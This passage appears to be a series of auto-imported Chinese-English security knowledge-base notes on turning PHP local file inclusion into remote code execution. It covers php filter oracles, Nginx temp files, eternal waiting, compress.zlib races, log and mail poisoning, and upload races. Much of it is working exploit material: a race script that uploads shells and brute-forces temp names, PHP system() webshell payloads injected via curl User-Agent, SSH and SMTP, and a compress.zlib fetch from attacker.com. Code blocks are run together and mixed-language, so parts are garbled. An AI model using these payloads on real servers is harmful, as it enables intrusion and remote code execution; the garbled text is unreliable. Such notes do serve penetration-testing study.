specific format (like json or maybe adding some PNG magic bytes) The previous script is limited to the base64 characters needed for that 载荷. Therefore, I created my own script to bruteforce all the base64 characters: Chain a memory bomb (e.g., a dozen convert.iconv.UTF8.UCS-4LE passes) with dechunk so the first leaked base64 digit controls the outcome: if it turns hexadecimal the 载荷 collapses silently, otherwise PHP exhausts memory and throws an error, giving you a 1-bit oracle. Query the oracle repeatedly while iconv shuffles (convert.iconv.UTF16.UTF16BE, convert.iconv.UCS-4LE.UCS-4, etc.) rotate arbitrary base64 digits to the front, letting you read files byte by byte even when nothing is echoed. Synacktiv's php filter chains oracle 利用 automates the chain, keeps 载荷 GET-safe, and documents the PHP file primitives (file get contents, finfo, 哈希 file, getimagesize, ...) that you can abuse to pivot from LFI to 凭据 or staged RCE. The release ships ready-to-run Python tooling: once you control include (), aim it at /etc/passwd, PHP session stores, or config files, dump them, then fall back to the base64-prepend method above to craft RCE 载荷 inside php://temp or other write-less sinks. # 命令 / 载荷 / 操作片段 # 1. content: 来源路径： 02-知识点/Web安全/LFI2RCE via Nginx temp files 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # LFI2RCE via Nginx temp files 技术笔记 [!summary] 提炼定位 面向 Web 安全 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 判断、验证或绕过 LFI2RCE via Nginx temp files 技术笔记 相关 Web 漏洞。 从输入点、解析链、权限边界、数据落点和回显 / 盲信道五个维度拆解。 # 中文提炼 核心目标是判断 LFI2RCE via Nginx temp files 技术笔记 的输入是否能影响服务端解析、权限判断或数据落点。 优先关注：LFI2RCE via Nginx temp files、Vulnerable configuration、Why nginx temp files are abusable、Classic 利用 workflow (recap)、Modern variations (2024–2025)；从最小 payload 开始证明可控，再扩展到读、写、执行或越权。 验证时把请求方法、参数位置、编码方式、Content-Type、身份状态和响应差异一起记录。 防御视角要补输入规范化、服务端校验、最小权限、日志与告警信号。 本页已沉淀 2 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 LFI2RCE via Nginx temp files Vulnerable configuration Why nginx temp files are abusable Classic 利用 workflow (recap) Modern variations (2024–2025) Practical tips # 核心要点 PHP’s include/require resolves those /proc/.../fd/... symlinks, so an attacker with LFI can hop through procfs to execute the buffered temp file even after nginx deletes it. Enumerate worker PIDs. Fetch /proc/<pid>/cmdline over the LFI until you find strings like nginx: worker process. The number of workers rarely exceeds the CPU count, so you only have to scan the lower PID space. Force nginx to create the temp file. Send very large POST/PUT bodies (or proxied responses) so that nginx spills to /var/lib/nginx/body/XXXXXXXX. Make sure the backend never reads the entire body—e.g., keep-alive the 上传 thread so nginx keeps the descriptor open. Ingress controllers and service meshes now routinely expose nginx instances with additional attack surface. CVE-2025-1974 ("IngressNightmare") is a good example of how the classic temp-file trick evolves: The vulnerable ingress-nginx template code allowed injecting directives into the generated nginx config. Combining that with the lingering temp file made it possible to brute-force /proc/<pid>/fd/<fd> links until the attacker discovered the buffered shared object. Injecting ssl engine /proc/<pid>/fd/<fd>; forced nginx to load the buffered .so. Constructors inside the shared object yielded immediate RCE inside the ingress controller pod, which in turn exposed Kubernetes secrets. When nginx disables buffering (proxy request buffering off, client body buffer size tuned high, or proxy max temp file size 0), the technique becomes much harder—so always enumerate config files and response headers to check whether buffering is still enabled. Hanging uploads are noisy but effective. Use multiple processes to flood workers so that at least one temp file stays around long enough for your LFI brute force to catch it. In Kubernetes or other orchestrators, privilege boundaries may look different, but the primitive is the same: find a way to drop bytes into nginx buffers, then walk /proc from anywhere you can issue file system reads. # 命令 / 载荷 / 操作片段 # 1. Vulnerable configuration 1234<?php$action = $_GET['action'] ?? 'read';$path = $_GET['file'] ?? 'index.php';$action === 'read' ? readfile($path) : include $path; # 2. Modern variations (2024–2025) 123456789101112131415161718#!/usr/bin/env python3import osdef find_tempfds(pid_range=range(100, 4000), fd_range=range(10, 80)): for pid in pid_range: fd_dir = f"/proc/{pid}/fd" if not os.path.isdir(fd_dir): continue for fd in fd_range: try: path = os.readlink(f"{fd_dir}/{fd}") if "client-body" in path or "nginx" in path: yield pid, fd, path except OSError: continuefor pid, fd, path in find_tempfds(): print(f"use ?file=/proc/{pid}/fd/{fd} # {path}") # 工具与参考入口 Example from bierbaumer.net https://2021.ctf.link/internal/challenge/ed0208cd-f91a-4260-912f-97733e8990fd/ https://2021.ctf.link/internal/challenge/a67e2921-e09a-4bfa-8e7e-11c51ac5ee32/ # 检查清单 是否定位输入点和服务端解析点 是否验证权限边界 / 租户边界 是否从最小化 payload 开始 是否记录成功与失败条件 # 关联 Web 安全总览 知识地图 文件上传与文件包含 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

content: 来源路径： 02-知识点/Web安全/LFI2RCE via Eternal waiting 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # LFI2RCE via Eternal waiting 技术笔记 [!summary] 提炼定位 面向 Web 安全 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 判断、验证或绕过 LFI2RCE via Eternal waiting 技术笔记 相关 Web 漏洞。 从输入点、解析链、权限边界、数据落点和回显 / 盲信道五个维度拆解。 # 中文提炼 核心目标是判断 LFI2RCE via Eternal waiting 技术笔记 的输入是否能影响服务端解析、权限判断或数据落点。 优先关注：LFI2RCE via Eternal waiting、Basic Information、Other techniques、Eternal wait technique、Apache2；从最小 payload 开始证明可控，再扩展到读、写、执行或越权。 验证时把请求方法、参数位置、编码方式、Content-Type、身份状态和响应差异一起记录。 防御视角要补输入规范化、服务端校验、最小权限、日志与告警信号。 本页已沉淀 2 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 LFI2RCE via Eternal waiting Basic Information Other techniques Eternal wait technique Apache2 PHP-FMP Nginx # 核心要点 By default when a file is uploaded to PHP (even if it isn't expecting it), it will generate a temporary file in /tmp with a name such as phpa-zA-Z0-9, although I have seen some Docker images where the generated files don't contain digits. In a 本地文件包含 LFI, if you manage to include that uploaded file, you will get RCE. Note that by default PHP only allows to 上传 20 files in a single request (set in /etc/php/<version>/apache2/php.ini): Other techniques relies in attacking PHP protocols (you won't be able if you only control the last part of the path), disclosing the path of the file, abusing expected files, or making PHP suffer a segmentation fault so uploaded temporary files aren't deleted.\ In this technique we only need to control a relative path. If we manage to 上传 files and make the LFI never end, we will have "enough time" to brute-force uploaded files and find any of the ones uploaded. By default only 20 files can be uploaded in a single request. This limit with the previous ones can make this attack last too much Timeout for a PHP request. Ideally this should be eternal or should kill the PHP process without deleting the temp uploaded files, if not, this will also be a pain We can use 149 connections to generate 149 * 20 = 2980 temp files with our webshell. # 命令 / 载荷 / 操作片段 # 1. Basic Information 12; Maximum number of files that can be uploaded via a single requestmax_file_uploads = 20 # 2. Eternal wait technique 12php -a # open php cliinclude("/sys/kernel/security/apparmor/revision"); # 工具与参考入口 https://ubiq.co/tech-blog/increase-max-connections-apache/ # 检查清单 是否定位输入点和服务端解析点 是否验证权限边界 / 租户边界 是否从最小化 payload 开始 是否记录成功与失败条件 # 关联 Web 安全总览 知识地图 文件上传与文件包含 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

content: 来源路径： 02-知识点/Web安全/LFI2RCE Via compress.zlib + PHP STREAM PREFER STUDIO + Path Disclosure 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # LFI2RCE Via compress.zlib + PHP STREAM PREFER STUDIO + Path Disclosure 技术笔记 [!summary] 提炼定位 面向 Web 安全 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 判断、验证或绕过 LFI2RCE Via compress.zlib + PHP STREAM PREFER STUDIO + Path Disclosure 技术笔记 相关 Web 漏洞。 从输入点、解析链、权限边界、数据落点和回显 / 盲信道五个维度拆解。 # 中文提炼 核心目标是判断 LFI2RCE Via compress.zlib + PHP STREAM PREFER STUDIO + Path Disclosure 技术笔记 的输入是否能影响服务端解析、权限判断或数据落点。 优先关注：LFI2RCE Via compress.zlib + PHP STREAM PREFER STUDIO + Path Disclosure、compress.zlib://and PHP STREAM PREFER STDIO、条件竞争 to RCE；从最小 payload 开始证明可控，再扩展到读、写、执行或越权。 验证时把请求方法、参数位置、编码方式、Content-Type、身份状态和响应差异一起记录。 防御视角要补输入规范化、服务端校验、最小权限、日志与告警信号。 本页已沉淀 2 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 LFI2RCE Via compress.zlib + PHP STREAM PREFER STUDIO + Path Disclosure compress.zlib:// and PHP STREAM PREFER STDIO 条件竞争 to RCE # 核心要点 Will send a request asking for http://attacker.com/file, then the server might respond the request with a valid HTTP response, keep the connection open, and send extra data some time later that will be also written into the file. The attacker will make the victim server open a connection reading a file from the attackers server using the compress.zlib protocol. While this connection exist the attacker will exfiltrate the path to the temp file created (it's leaked by the server). While the connection is still open, the attacker will 利用 a LFI loading the temp file that he controls. For more information check the description of the 条件竞争 and the CTF in https://balsn.tw/ctf writeup/20191228-hxp36c3ctf/#includer # 命令 / 载荷 / 操作片段 # 1. compress.zlib:// and PHP STREAM PREFER STDIO 1file_get_contents("compress.zlib://http://attacker.com/file") # 2. compress.zlib:// and PHP STREAM PREFER STDIO 1234567/* Use a tmpfile and copy the old streams contents into it */ if (flags & PHP_STREAM_PREFER_STDIO) { *newstream = php_stream_fopen_tmpfile(); } else { *newstream = php_stream_temp_new(); } # 工具与参考入口 This CTF # 检查清单 是否定位输入点和服务端解析点 是否验证权限边界 / 租户边界 是否从最小化 payload 开始 是否记录成功与失败条件 # 关联 Web 安全总览 知识地图 文件上传与文件包含 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

content: 来源路径： 02-知识点/Web安全/LFI to RCE 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # LFI to RCE 技术笔记 [!summary] 提炼定位 面向 Web 安全 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 判断、验证或绕过 LFI to RCE 技术笔记 相关 Web 漏洞。 从输入点、解析链、权限边界、数据落点和回显 / 盲信道五个维度拆解。 # 中文提炼 核心目标是判断 LFI to RCE 技术笔记 的输入是否能影响服务端解析、权限判断或数据落点。 优先关注：LFI to RCE、LFI to RCE via /proc/*/fd、LFI to RCE via /proc/self/environ、LFI to RCE via iconv、LFI to RCE via 上传；从最小 payload 开始证明可控，再扩展到读、写、执行或越权。 验证时把请求方法、参数位置、编码方式、Content-Type、身份状态和响应差异一起记录。 防御视角要补输入规范化、服务端校验、最小权限、日志与告警信号。 本页已沉淀 23 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 LFI to RCE LFI to RCE via /proc/*/fd LFI to RCE via /proc/self/environ LFI to RCE via iconv LFI to RCE via 上传 LFI to RCE via 上传 (race) LFI to RCE via 上传 (FindFirstFile) LFI to RCE via phpinfo() LFI to RCE via controlled log file RCE via SSH RCE via Mail RCE via Apache logs LFI to RCE via PHP sessions LFI to RCE via PHP PEARCMD LFI to RCE via 凭据 files Windows version Linux version # 核心要点 上传 a lot of shells (for example : 100) Like a log file, send the 载荷 in the User-Agent header, it will be reflected inside the /proc/self/environ file ambionics/cnext-exploits If you can 上传 a file, just inject the shell 载荷 in it (e.g : <?php system ($ GET ['c']); ?> ). In order to keep the file readable it is best to inject into the metadata for the pictures/doc/pdf 上传 a file and trigger a self-inclusion. Repeat the 上传 a shitload of time to: Method 3: 下载 (need external network connection). Method 4: install (need external network connection). Notice that exec.php locates at /tmp/pear/ 下载 /exec.php. # 命令 / 载荷 / 操作片段 # 1. LFI to RCE via /proc/*/fd 1http://example.com/index.php?page=/proc/$PID/fd/$FD # 2. LFI to RCE via /proc/self/environ 12GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1User-Agent: <?=phpinfo(); ?> # 3. LFI to RCE via 上传 1http://example.com/index.php?page=path/to/uploaded/file.png # 4. LFI to RCE via 上传 (race) 12345678910111213141516171819import itertoolsimport requestsimport sysprint('[+] Trying to win the race')f = {'file': open('shell.php', 'rb')}for _ in range(4096 * 4096): requests.post('http://target.com/index.php?c=index.php', f)print('[+] Bruteforcing the inclusion')for fname in itertools.combinations(string.ascii_letters + string.digits, 6): url = 'http://target.com/index.php?c=/tmp/php' + fname r = requests.get(url) if 'load average' in r.text: # <?php echo system('uptime'); print('[+] We have got a shell: ' + url) sys.exit(0)print('[x] Something went wrong, please try again') # 5. LFI to RCE via controlled log file 123456789101112http://example.com/index.php?page=/var/log/apache/access.loghttp://example.com/index.php?page=/var/log/apache/error.loghttp://example.com/index.php?page=/var/log/apache2/access.loghttp://example.com/index.php?page=/var/log/apache2/error.loghttp://example.com/index.php?page=/var/log/nginx/access.loghttp://example.com/index.php?page=/var/log/nginx/error.loghttp://example.com/index.php?page=/var/log/vsftpd.loghttp://example.com/index.php?page=/var/log/sshd.loghttp://example.com/index.php?page=/var/log/mailhttp://example.com/index.php?page=/var/log/httpd/error_loghttp://example.com/index.php?page=/usr/local/apache/log/error_loghttp://example.com/index.php?page=/usr/local/apache2/log/error_log # 6. RCE via SSH 1ssh <?php system($_GET["cmd"]);?>@10.10.10.10 # 7. RCE via SSH 1http://example.com/index.php?page=/var/log/auth.log&cmd=id # 8. RCE via Mail 12345678910111213141516root@kali:~# telnet 10.10.10.10. 25Trying 10.10.10.10....Connected to 10.10.10.10..Escape character is '^]'.220 straylight ESMTP Postfix (Debian/GNU)helo ok250 straylightmail from: mail@example.com250 2.1.0 Okrcpt to: root250 2.1.5 Okdata354 End data with <CR><LF>.<CR><LF>subject: <?php echo system($_GET["cmd"]); ?>data2. # 9. RCE via Mail 1mail -s "<?php system($_GET['cmd']);?>" www-data@10.10.10.10. < /dev/null # 10. RCE via Apache logs 1curl http://example.org/ -A "<?php system(\$_GET['cmd']);?>" # 11. RCE via Apache logs 1curl http://example.org/test.php?page=/var/log/apache2/access.log&cmd=id # 12. Moreover, the 利用 process is simplified on Windows systems. A peculiarity in the FindFirstFile function permits the use of wildcards in 本地文件包含 LFI (LFI) paths. This enables crafting an include path like the following to locate the temporary file: In certain situations, a more specific mask (like php1<< or phpA<<) might be required. One can systematically try these masks to discover the uploaded temporary file. For GNU/Linux systems, the randomness in temporary file naming is robust, rendering the names neither predictable nor susceptible to brute force attacks.
